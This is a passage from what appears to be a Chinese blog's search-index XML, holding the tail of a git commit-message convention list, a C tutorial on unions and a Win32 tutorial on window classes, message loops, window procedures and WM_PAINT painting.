新功能</li><li>fix: 修复bug</li><li>docs: 文档改变</li><li>style: 代码格式改变</li><li>refactor: 某个已有功能重构</li><li>perf: 性能优化</li><li>test: 增加测试</li><li>build: 构建工具或外部依赖包的修改</li><li>revert: 撤销上一次的 commit</li><li>chore: 构建过程或辅助工具的变动</li></ul><h3 id="scope">scope</h3><p>可选,用于说明影响的范围,比如数据层、控制层、视图层等.</p><h3 id="subject">subject</h3><p>必须,简短描述,不超过50字符.</p><h3 id="body">body</h3><p>可选,对subject的补充,可以多行.</p><h2 id="footer">footer</h2><p>可选,关联issue</p>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-14_4-共用体</title>
      <link href="/2024f9a5468d726b/"/>
      <url>/2024f9a5468d726b/</url>
      
        <content type="html"><![CDATA[<h1 id="union-联合体的声明和使用">union-联合体的声明和使用</h1><p>联合体(或称共用体),是一种数据类型,能够在同一个内存空间中存储不同类型的数据,但不能同时访问.</p><p>定义一个联合体,和结构体类似,一个联合内有多个不同类型的成员,但是使用<code>union</code>关键字:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">num</span> &#123;</span></span><br><span class="line">        <span class="type">char</span> c;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">double</span> d;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>与结构体类似,这样就定义了一个联合体类型.接下来就可以使用该类型声明若干联合体变量:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">num</span> &#123;</span></span><br><span class="line">        <span class="type">char</span> c;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">double</span> d;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">num</span> <span class="title">num1</span>;</span> <span class="comment">// num1为联合体类型num的变量</span></span><br><span class="line">    num1.i = <span class="number">3</span>; <span class="comment">// 把int值3存储在num1中</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,num1.i); <span class="comment">// 输出</span></span><br><span class="line">    num1.c = <span class="string">&#x27;A&#x27;</span>; <span class="comment">// 清除原来的3,把char值&#x27;A&#x27;存储在num1中</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>,num1.c); <span class="comment">// 输出</span></span><br><span class="line">    num1.d = <span class="number">3.141592</span>; <span class="comment">// 清除原来的&#x27;A&#x27;,把double值3.141592存储在num1中</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.2lf\n&quot;</span>,num1.d); <span class="comment">// 输出</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样,也可以声明联合体指针,联合体数组等.</p><h1 id="联合体成员的初始化与赋值">联合体成员的初始化与赋值</h1><p>有如下几种方法:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">num1</span>,<span class="title">num2</span>;</span></span><br><span class="line">num1.i = <span class="number">3</span>; <span class="comment">// 直接赋值其指定成员</span></span><br><span class="line">num2 = num1; <span class="comment">// 用另一个联合体变量来赋值</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">num3</span> =</span> &#123;<span class="string">&#x27;A&#x27;</span>&#125;; <span class="comment">// 初始化联合体的成员c(即第一个成员)</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">num4</span> =</span> &#123;.i = <span class="number">12</span>&#125;; <span class="comment">// C99,使用指定初始化器,本例中指定初始化成员i</span></span><br></pre></td></tr></table></figure><h1 id="访问联合体成员的问题">访问联合体成员的问题</h1><p>与结构体不同,联合体的各个成员都共用同一段内存,这意味着当对于一个类型的成员赋值后,其他类型的成员存储的值将不再有效.此时如果直接访问其他成员,结果是<code>未定义的</code>.</p><p>联合体的各个成员的类型所占用的内存大小各不相同,联合体只大到足够保存其内最大的成员(例如上例中的double d,其他成员被分配于该最大成员中某一部分相同的字节中.而不是像结构体那样每个成员都有自己的空间.</p><p>注:末尾也可能添加额外的填充字符.</p><p>总结需要注意的有2点:</p><ol><li><p>访问联合体的某个特定成员之前,请确保它被正确赋值.</p></li><li><p>如果在访问某个特定成员(A)之前,对另一个成员(B)赋值了,那么该特定成员(A)的值<code>应该</code>被认为是被破坏的,它(A)不应被访问.</p><p>换句话说,即使在某个实现中,该内存中原来的(部分)数据仍然未变,也不能认为他们还是有效的,因为他们是共用体的一部分,应该认为其已经损坏.</p></li><li><p>对某一成员(A)赋值后,直接访问另个成员(B),结果是未定义的,得到的任何结果都是不可信的(或者说是不可靠的).</p></li></ol><br><p>联合体比较简单,需要注意不要错误地访问未赋值的成员.</p><p align=right>——WAHAHA 2024.2.24 我还在火车上~</p><br><br><p>上一篇:<a href="../202423c9a8f7f871/">C语言教程-14_3-使用位域进行位操作</a></p><p>下一篇:<a href="../202434c442170e12">C语言教程-14_5-枚举</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows窗口</title>
      <link href="/202498c4a84379b6/"/>
      <url>/202498c4a84379b6/</url>
      
        <content type="html"><![CDATA[<h1 id="窗口类">窗口类</h1><p>每个窗口都必须和一个窗口类(非C++意义的类)相关联,窗口类在运行时向系统注册,注册窗口类使用<code>WNDCLASS结构</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Register the window class.</span></span><br><span class="line"><span class="type">const</span> <span class="type">wchar_t</span> CLASS_NAME[]  = <span class="string">L&quot;Sample Window Class&quot;</span>;</span><br><span class="line"></span><br><span class="line">WNDCLASS wc = &#123; &#125;;</span><br><span class="line"></span><br><span class="line">wc.lpfnWndProc   = WindowProc;</span><br><span class="line">wc.hInstance     = hInstance;</span><br><span class="line">wc.lpszClassName = CLASS_NAME;</span><br></pre></td></tr></table></figure><p>其中:</p><ul><li>lpfnWndProc 是指向应用程序定义的函数(<code>窗口过程</code>)的指针,窗口过程定义窗口大部分的行为.</li><li>hInstance 是应用程序实例的句柄.</li><li>lpszClassName 是标识窗口类的字符串.</li></ul><p>类名需要在进程中唯一,且不能与标准Windows控件类名(例如Button)冲突.</p><p>其他成员可以填充为0.</p><p>然后将该结构变量的地址传递给<code>RegisterClass</code>函数,来注册到操作系统:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RegisterClass(&amp;wc);</span><br></pre></td></tr></table></figure><h1 id="创建窗口">创建窗口</h1><p>使用<code>CreateWindowEx</code>函数创建窗口的新实例.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HWND <span class="title function_">CreateWindowEx</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]           DWORD     dwExStyle,</span></span><br><span class="line"><span class="params">  [in, optional] LPCSTR    lpClassName,</span></span><br><span class="line"><span class="params">  [in, optional] LPCSTR    lpWindowName,</span></span><br><span class="line"><span class="params">  [in]           DWORD     dwStyle,</span></span><br><span class="line"><span class="params">  [in]           <span class="type">int</span>       X,</span></span><br><span class="line"><span class="params">  [in]           <span class="type">int</span>       Y,</span></span><br><span class="line"><span class="params">  [in]           <span class="type">int</span>       nWidth,</span></span><br><span class="line"><span class="params">  [in]           <span class="type">int</span>       nHeight,</span></span><br><span class="line"><span class="params">  [in, optional] HWND      hWndParent,</span></span><br><span class="line"><span class="params">  [in, optional] HMENU     hMenu,</span></span><br><span class="line"><span class="params">  [in, optional] HINSTANCE hInstance,</span></span><br><span class="line"><span class="params">  [in, optional] LPVOID    lpParam</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><ul><li>dwExStyle 制定扩展窗口样式,例如透明窗口.默认设置为0即可.</li><li>lpClassName 窗口类名,定义要创建的窗口的类型.</li><li>lpWindowName 窗口名称,如果窗口样式指定标题栏,则其将显示在标题栏中.</li><li>dwStyle 窗口样式,它是一组标志,用于定义窗口的一些外观.</li><li>X 窗口初始的水平坐标,<code>CW_USEDEFAULT</code>表示使用默认值(仅对重叠窗口有效,如果为弹出窗口或子窗口指定，则X和Y参数设置为零).</li><li>Y 同上类似.</li><li>nWidth,nHeight 窗口的宽度,高度,以设备单位为单位,<code>CW_USEDEFAULT</code>为默认值.</li><li>hWndParent 正在创建的窗口的父窗口或所有者窗口的句柄,对于顶级窗口,设置为NULL.</li><li>hMenu 菜单句柄,或指定子窗口标识符,具体取决于窗口样式.可以设为NULL.</li><li>hInstance 如前所述,为<code>实例句柄</code>.</li><li>lpParam <code>void*</code>的任意数据的指针,使用此值来将数据结构传递到窗口过程.</li></ul><p><code>CreateWindowEx</code>返回新窗口的句柄,如果失败则返回0.</p><p>如果要显示窗口,则将返回的句柄传递给<code>ShowWindow</code>函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ShowWindow(hwnd, nCmdShow);</span><br></pre></td></tr></table></figure><p>其中nCmdShow可用于最小化或最大化窗口,操作系统通过<code>wWinMain</code>函数将此值传递给程序(?)</p><h1 id="消息循环">消息循环</h1><h2 id="事件与消息">事件与消息</h2><p>有两种<code>事件</code>:</p><ul><li>来自用户的事件: 用户与程序交互的所有方式:鼠标单击,击键等.</li><li>来自操作系统的事件:&quot;程序外部&quot;的任何可能影响程序行为方式的内容,例如插入新硬件设备等.</li></ul><p>事件在程序运行的任何时间,几乎任何顺序发生,为了处理这样无法预测的事件,Windows使用<code>消息传递模型</code>,即操作系统通过向应用程序窗口传递消息来与应用程序窗口通信,消息只是指定特定事件的数字代码.</p><p>例如当<code>按下左键</code>时,窗口将收到如下消息代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WM_LBUTTONDOWN    0x0201</span></span><br></pre></td></tr></table></figure><p>某些消息具有与之关联的数据,例如鼠标光标的x,y坐标.</p><p>要将消息传递到窗口,操作系统会调用为窗口注册的<code>窗口过程</code>.</p><h2 id="获取消息与消息循环">获取消息与消息循环</h2><p>应用程序在运行时会收到大量消息,同时应用程序可能会有多个窗口,每个窗口都有自己的<code>窗口过程</code>,应用程序需要一个循环来检索消息并将其调度到正确的窗口.</p><p>对每个线程,操作系统都会为其消息窗口创建一个队列,用于保存在该线程上创建的所有窗口的消息.该队列本身对程序隐藏,使用<a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/winuser/nf-winuser-getmessage">GetMessage</a>函数来操作该队列:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">GetMessage</span><span class="params">(</span></span><br><span class="line"><span class="params">  [out]          LPMSG lpMsg,</span></span><br><span class="line"><span class="params">  [in, optional] HWND  hWnd,</span></span><br><span class="line"><span class="params">  [in]           UINT  wMsgFilterMin,</span></span><br><span class="line"><span class="params">  [in]           UINT  wMsgFilterMax</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>其中:</p><ul><li><p>lpMsg 为指向<a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/winuser/ns-winuser-msg">MSG</a>结构的指针,该结构用于从消息队列中接受消息信息.</p></li><li><p>hWnd 要检索其消息的窗口的句柄,一般为NULL(检索属于当前线程的任何窗口的消息以及当前线程的消息队列上hwnd值为NULL的任何消息)—处理窗口消息和线程消息.</p><p>如果为-1,则仅检索当前线程的消息队列上hwnd值为NULL的任何消息或<a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/winuser/nf-winuser-postmessagea">PostMessage</a>发布的线程消息.</p></li><li><p>wMsgFilterMin 要检索的最低消息值的整数值.</p></li><li><p>wMsgFilterMax 要检索的最高消息值的整数值.</p></li><li><p>如果wMsgFilterMin和wMsgFilterMax均为零,则GetMessage将返回所有可用消息,即不执行范围筛选.</p></li></ul><p>如果检索<a href="https://learn.microsoft.com/zh-cn/windows/desktop/winmsg/wm-quit">WM_QUIT</a>以外的消息,返回非零;检索<a href="https://learn.microsoft.com/zh-cn/windows/desktop/winmsg/wm-quit">WM_QUIT</a>返回零;出现错误则返回-1.</p><p>GetMessage函数从队列的头部删除一条消息,若队列为空则该函数阻塞(但不会使程序无响应),因此后台处理需要创建另一个<code>线程</code>.</p><p>例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MSG msg;</span><br><span class="line">GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><br><p>几乎不需要手动检查<a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/winuser/ns-winuser-msg">MSG</a>结构,只需要将其传递给如下函数即可:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TranslateMessage(&amp;msg); <span class="comment">// 与键盘输入相关,将击键(上,下)转换为字符.在DispatchMessage之前调用</span></span><br><span class="line">DispatchMessage(&amp;msg); <span class="comment">// 指示操作系统调用窗口的窗口过程</span></span><br></pre></td></tr></table></figure><br><p>需要一个循环来不断从队列中拉取消息并调度它们,如果需要退出应用程序并中断消息循环,调用<a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/winuser/nf-winuser-postquitmessage">PostQuitMessage</a>函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PostQuitMessage(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>该函数将<a href="https://learn.microsoft.com/zh-cn/windows/desktop/winmsg/wm-quit">WM_QUIT</a>消息置于消息队列中,导致<code>GetMessage</code>返回零,标志着消息循环结束,例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MSG msg = &#123; &#125;;</span><br><span class="line"><span class="keyword">while</span> (GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>) &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    TranslateMessage(&amp;msg);</span><br><span class="line">    DispatchMessage(&amp;msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="已发布消息与已发送消息">已发布消息与已发送消息</h1><p>操作系统有时会绕过消息队列直接调用窗口过程.</p><ul><li><code>发布消息</code>意味着消息进入消息队列.</li><li><code>发送消息</code>意味着消息跳过队列,操作系统直接调用窗口过程.</li></ul><p>如果应用程序在窗口之间通信,则可能有所不同,详见 <a href="https://learn.microsoft.com/zh-cn/windows/desktop/winmsg/about-messages-and-message-queues">消息和消息队列</a>.</p><h1 id="编写窗口过程">编写窗口过程</h1><p>如前所述,<code>DispatchMessage</code>函数调用窗口的<code>窗口过程</code>,该窗口是消息的目标.</p><p><code>窗口过程</code>有以下签名:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK <span class="title function_">WindowProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span>;</span><br></pre></td></tr></table></figure><p>其中:</p><ul><li><p>hwnd 是窗口的句柄.</p></li><li><p>uMsg 是消息代码.</p></li><li><p>wParam和lParam 包含与消息相关的其他数据,具体含义依赖于消息代码(数值/指针).对于每条消息,都需要根据消息代码并将其强转为正确的数据类型.</p></li><li><p>LRESULT 是程序返回到Windows的整数值,包含程序对特定消息的响应,具体含义同样取决于消息代码.</p></li></ul><p>例如处理<code>WM_SIZE</code>消息:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK <span class="title function_">WindowProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (uMsg)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> WM_SIZE:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> width = LOWORD(lParam);  <span class="comment">// Macro to get the low-order word.</span></span><br><span class="line">            <span class="type">int</span> height = HIWORD(lParam); <span class="comment">// Macro to get the high-order word.</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// Respond to the message:</span></span><br><span class="line">            OnSize(hwnd, (UINT)wParam, width, height);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">OnSize</span><span class="params">(HWND hwnd, UINT flag, <span class="type">int</span> width, <span class="type">int</span> height)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Handle resizing</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>LOWORD</code>和`HIWORD是2个宏,用于获取16位数据(参考MSDN文档).</p><br><p>如果不在窗口消息中处理特定消息,请将消息参数直接传递到<a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/winuser/nf-winuser-defwindowproca"><code>DefWindowProc</code></a>函数,此函数对消息执行默认操作,因消息类型而异:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> DefWindowProc(hwnd, uMsg, wParam, lParam);</span><br></pre></td></tr></table></figure><br><p>注意:当窗口过程执行时,它会阻止在同一线程上创建的窗口的任何其他消息.</p><p>因此,请不要在窗口过程中进行冗长处理,例如TCP连接并无限等待,这会让窗口在完成该任务前无法做出其他任何响应,甚至无法关闭!</p><p>相反,请将该工作移动到另一个线程,该操作可以使用Windows如下<code>多任务工具</code>的一种来实现:</p><ul><li>创建新进程</li><li>使用线程池</li><li>使用异步I/O调用</li><li>使用异步过程调用</li></ul><h1 id="绘制窗口">绘制窗口</h1><p>到此为止已经创建窗口,接下来想要在其内绘制一些东西,Windows术语叫做<code>绘制窗口</code>.换句话说,窗口是一个空白的画布,它等待被绘制(填充).</p><p>有时，程序会启动绘制以更新窗口的外观。 在其他时候，操作系统会通知你必须重新绘制窗口的一部分。 发生这种情况时，操作系统会向窗口发送<a href="https://learn.microsoft.com/zh-cn/windows/desktop/gdi/wm-paint">WM_PAINT</a>消息。 必须绘制的窗口部分称为 更新区域。</p><p>首次显示消息时,必须绘制窗口的整个工作区,即在显示窗口时,始终会收到至少一条<code>WM_PAINT</code>消息.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/painting01.png" alt="显示窗口更新区域的插图" style="zoom:60%;" /><p>你只负责绘制工作区.外面的框架(包括标题栏)由操作系统自动绘制.完成绘制后,清除更新区域,这会通知操作系统,在发生更改前,其不需要发送另一条<code>WM_PAINT</code>消息.(?)</p><br><p>假设用户移动了窗口,使其遮挡了窗口的一部分,当遮挡部分再次可见时,该部分将添加到更新区域,并且窗口会收到另一条<code>WM_PAINT</code>消息:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/painting02.png" alt="显示当两个窗口重叠时更新区域如何更改的插图" style="zoom:60%;" /><p>同样,如果用户拉伸窗口,新的区域将添加到更新区域:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/painting03.png" alt="显示调整窗口大小时更新区域如何更改的插图" style="zoom:60%;" /><br><p>绘制窗口时,先使用<a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/winuser/nf-winuser-beginpaint">BeginPaint</a>函数来启动绘制操作, 此函数使用有关重画请求的信息填充<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winuser/ns-winuser-paintstruct">PAINTSTRUCT</a>结构:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HDC <span class="title function_">BeginPaint</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  HWND          hWnd,</span></span><br><span class="line"><span class="params">  [out] LPPAINTSTRUCT lpPaint</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>其中:</p><ul><li>hWnd 是要求重新绘制的窗口的句柄.</li><li>lpPaint 是指向接收绘制信息的<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winuser/ns-winuser-paintstruct">PAINTSTRUCT</a>结构的指针.</li><li>如果函数成功,则返回指定窗口的显示设备上下文的句柄;如果函数失败，则返回值为 <strong>NULL</strong>，指示没有可用的显示设备上下文.</li></ul><br><p>对 <strong>BeginPaint</strong> 的每个调用都必须具有对 <a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/winuser/nf-winuser-endpaint">EndPaint</a> 函数的相应调用!</p><p>然后可以使用<a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/winuser/nf-winuser-fillrect">FillRect</a>函数来绘制矩形,此函数包括矩形的左和上边框,不包括右和下边框:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">FillRect</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HDC        hDC,</span></span><br><span class="line"><span class="params">  [in] <span class="type">const</span> RECT *lprc,</span></span><br><span class="line"><span class="params">  [in] HBRUSH     hbr</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>其中:</p><ul><li>hDC 是设备上下文的句柄.</li><li>lprc 是指向<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/windef/ns-windef-rect">RECT</a>结构的指针,该结构包含矩形的逻辑坐标.</li><li>hbr 是画笔句柄,其可以是逻辑画笔的句柄,也可以是颜色值.</li><li>如果成功,则返回非零值;否则返回零.</li></ul><br><p>完成绘制后,(必须)调用<a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/winuser/nf-winuser-endpaint">EndPaint</a>函数,该函数清除更新区域,向Windows发出窗口已完成绘制本身的信号:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">EndPaint</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HWND              hWnd,</span></span><br><span class="line"><span class="params">  [in] <span class="type">const</span> PAINTSTRUCT *lpPaint</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><ul><li>hWnd 是已重新绘制的窗口的句柄.</li><li>lpPaint 是指向<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winuser/ns-winuser-paintstruct">PAINTSTRUCT</a>结构的指针.</li><li>返回值始终为非零值.</li></ul><br><p>上述使用的<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winuser/ns-winuser-paintstruct">PAINTSTRUCT</a>结构体包含应用程序的信息,可用于绘制该应用程序拥有的窗口的工作区:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagPAINTSTRUCT</span> &#123;</span></span><br><span class="line">  HDC  hdc;</span><br><span class="line">  BOOL fErase;</span><br><span class="line">  RECT rcPaint;</span><br><span class="line">  BOOL fRestore;</span><br><span class="line">  BOOL fIncUpdate;</span><br><span class="line">  BYTE rgbReserved[<span class="number">32</span>];</span><br><span class="line">&#125; PAINTSTRUCT, *PPAINTSTRUCT, *NPPAINTSTRUCT, *LPPAINTSTRUCT;</span><br></pre></td></tr></table></figure><p>其中:</p><ul><li><p>hdc: 要用于绘制的显示 DC 的句柄。</p></li><li><p>fErase: 指示是否必须擦除背景。 如果应用程序应擦除背景，则此值为非零值。 如果创建窗口类时没有背景画笔，则应用程序负责擦除背景。 有关详细信息，请参阅 <a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/winuser/ns-winuser-wndclassa">WNDCLASS</a> 结构的 <strong>hbrBackground</strong> 成员的说明。</p></li><li><p>rcPaint: <a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/windef/ns-windef-rect">RECT</a>结构，指定请求绘制的矩形的左上角和右下角，以相对于工作区左上角的设备单位表示。</p></li><li><p>fRestore: 保留;由系统内部使用。</p></li><li><p>fIncUpdate: 保留;由系统内部使用。</p></li><li><p>rgbReserved[32]: 保留;由系统内部使用。</p></li></ul><br><p>例如,如下例子使用纯色(用户定义的系统背景色)来填充工作区:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (uMsg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> WM_PAINT:</span><br><span class="line">    &#123;</span><br><span class="line">        PAINTSTRUCT ps;</span><br><span class="line">        HDC hdc = BeginPaint(hwnd, &amp;ps);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// All painting occurs here, between BeginPaint and EndPaint.</span></span><br><span class="line"></span><br><span class="line">        FillRect(hdc, &amp;ps.rcPaint, (HBRUSH) (COLOR_WINDOW+<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        EndPaint(hwnd, &amp;ps);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Win32编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> Win32 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ANSI终端控制码</title>
      <link href="/20249af2dca3d7f5/"/>
      <url>/20249af2dca3d7f5/</url>
      
